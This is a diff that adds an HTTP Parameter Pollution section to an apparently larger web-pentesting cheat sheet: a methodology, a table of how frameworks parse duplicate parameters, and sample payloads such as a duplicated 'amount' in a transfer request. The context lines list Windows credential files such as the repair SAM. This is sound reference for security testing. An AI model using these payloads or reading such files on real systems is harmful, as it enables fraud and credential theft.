@@ -780,6 +780,85 @@ c:/unattended.xml
 c:/windows/repair/sam
 c:/windows/repair/system
 ```
+# HTTP Parameter Pollution
+
+## Methodology
+
+HTTP Parameter Pollution (HPP) is a web security vulnerability where an attacker injects multiple instances of the same HTTP parameter into a request. The server's behavior when processing duplicate parameters can vary, potentially leading to unexpected or exploitable behavior.
+
+HPP can target two levels:
+
+* Client-Side HPP: Exploits JavaScript code running on the client (browser).
+* Server-Side HPP: Exploits how the server processes multiple parameters with the same name.
+
+**Examples**:
+
+```ps1
+/app?debug=false&debug=true
+/transfer?amount=1&amount=5000
+```
+
+### Parameter Pollution Table
+
+When ?par1=a&par1=b
+
+| Technology                                      | Parsing Result           | outcome (par1=) |
+| ----------------------------------------------- | ------------------------ | --------------- |
+| ASP.NET/IIS                                     | All occurrences          | a,b             |
+| ASP/IIS                                         | All occurrences          | a,b             |
+| Golang net/http - `r.URL.Query().Get("param")`  | First occurrence         | a               |
+| Golang net/http - `r.URL.Query()["param"]`      | All occurrences in array | ['a','b']       |
+| IBM HTTP Server                                 | First occurrence         | a               |
+| IBM Lotus Domino                                | First occurrence         | a               |
+| JSP,Servlet/Tomcat                              | First occurrence         | a               |
+| mod_wsgi (Python)/Apache                        | First occurrence         | a               |
+| Nodejs                                          | All occurrences          | a,b             |
+| Perl CGI/Apache                                 | First occurrence         | a               |
+| Perl CGI/Apache                                 | First occurrence         | a               |
+| PHP/Apache                                      | Last occurrence          | b               |
+| PHP/Zues                                        | Last occurrence          | b               |
+| Python Django                                   | Last occurrence          | b               |
+| Python Flask                                    | First occurrence         | a               |
+| Python/Zope                                     | All occurrences in array | ['a','b']       |
+| Ruby on Rails                                   | Last occurrence          | b               |
+
+### Parameter Pollution Payloads
+
+* Duplicate Parameters:
+
+    ```ps1
+    param=value1&param=value2
+    ```
+
+* Array Injection:
+
+    ```ps1
+    param[]=value1
+    param[]=value1&param[]=value2
+    param[]=value1&param=value2
+    param=value1&param[]=value2
+    ```
+
+* Encoded Injection:
+
+    ```ps1
+    param=value1%26other=value2
+    ```
+
+* Nested Injection:
+
+    ```ps1
+    param[key1]=value1&param[key2]=value2
+    ```
+
+* JSON Injection:
+
+    ```ps1
+    {
+        "test": "user",
+        "test": "admin"
+    }
+    ```
 
 # 5. Parameter Tampering (All Parameters Change)
 
